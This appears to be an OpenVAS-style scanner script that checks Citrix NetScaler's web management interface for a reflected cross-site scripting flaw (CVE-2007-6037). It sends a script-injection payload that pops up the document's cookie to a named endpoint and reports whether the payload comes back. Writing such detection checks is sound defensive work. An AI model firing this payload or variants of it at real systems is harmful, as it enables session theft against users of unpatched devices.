if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.80027" );
	script_version( "$Revision: 14310 $" );
	script_tag( name: "last_modification", value: "$Date: 2019-03-19 11:27:27 +0100 (Tue, 19 Mar 2019) $" );
	script_tag( name: "creation_date", value: "2008-10-24 20:15:31 +0200 (Fri, 24 Oct 2008)" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_name( "NetScaler web management XSS" );
	script_family( "Web application abuses" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_cve_id( "CVE-2007-6037" );
	script_bugtraq_id( 26491 );
	script_xref( name: "OSVDB", value: "39009" );
	script_copyright( "This script is Copyright (c) 2008 nnposter" );
	script_dependencies( "netscaler_web_detect.sc" );
	script_mandatory_keys( "citrix_netscaler/http/detected" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The remote Citrix NetScaler web management interface is susceptible
  to cross-site scripting attacks." );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/483920/100/0/threaded" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("url_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
port = get_kb_item( "citrix_netscaler/http/port" );
if(!port || !get_tcp_port_state( port )){
	exit( 0 );
}
xss = "</script><script>alert(document.cookie)</script><script>";
url = "/ws/generic_api_call.pl?function=statns&standalone=" + urlencode( str: xss );
resp = http_keepalive_send_recv( port: port, data: http_get( item: url, port: port ), embedded: TRUE );
if(!resp || !ContainsString( resp, xss )){
	exit( 99 );
}
report = "The following URLs have been found vulnerable :\\n\\n" + ereg_replace( string: url, pattern: "\\?.*$", replace: "" );
security_message( port: port, data: report );
exit( 0 );

